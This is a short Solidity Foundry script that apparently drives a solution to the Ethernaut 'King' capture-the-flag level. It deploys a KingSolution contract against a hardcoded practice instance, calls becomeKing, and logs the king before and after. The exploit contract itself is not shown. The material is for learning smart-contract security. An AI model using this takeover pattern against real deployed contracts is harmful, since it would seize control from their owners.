// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/src/Script.sol";
import "forge-std/src/Test.sol";

import {KingSolution} from "../KingSolution.sol";

import {IKing} from "../IKing.sol";

contract KingScript is Script, Test {
  KingSolution private kingSolution;
  address payable private constant KING_INSTANCE = payable(0xC11c636728Cd25D1ad8Bded81CB7aC1CdE248cC3);

  // King private king;

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    IKing king = IKing(KING_INSTANCE);
    address currentKing = king._king();

    console2.log("----------------------------------------------------------");
    console2.log("currentKing", currentKing);
    console2.log("----------------------------------------------------------");

    kingSolution = new KingSolution();

    bool res = kingSolution.becomeKing(king);

    currentKing = king._king();

    console2.log("----------------------------------------------------------");
    console2.log("res", res);
    console2.log("currentKing", currentKing);
    console2.log("----------------------------------------------------------");

    vm.stopBroadcast();
  }
}
